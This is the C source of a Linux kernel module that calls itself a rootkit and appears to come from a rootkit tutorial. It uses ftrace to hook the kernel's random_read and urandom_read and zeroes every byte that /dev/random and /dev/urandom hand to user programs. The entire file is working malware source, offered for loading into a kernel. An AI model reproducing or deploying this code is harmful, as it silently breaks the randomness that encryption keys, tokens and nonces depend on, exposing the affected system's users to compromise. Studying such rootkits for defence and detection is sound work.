#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Interfering with char devices");
MODULE_VERSION("0.01");

/* Function pointer declarations for the real random_read() and urandom_read() */
static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

/* Hook functions for random_read() and urandom_read() */
static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real random_read() file operation to set up all the structures */
    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into
     * Note that copy_from_user() returns the number of bytes that could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real urandom_read() file operation to set up all the structures */
    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into.
     * Note that copy_from_user() returns the number of bytes the could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of 
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook hooks[] = {
	HOOK("random_read", hook_random_read, &orig_random_read),
        HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Simply call fh_install_hooks() with hooks (defined above) */
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Simply call fh_remove_hooks() with hooks (defined above) */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
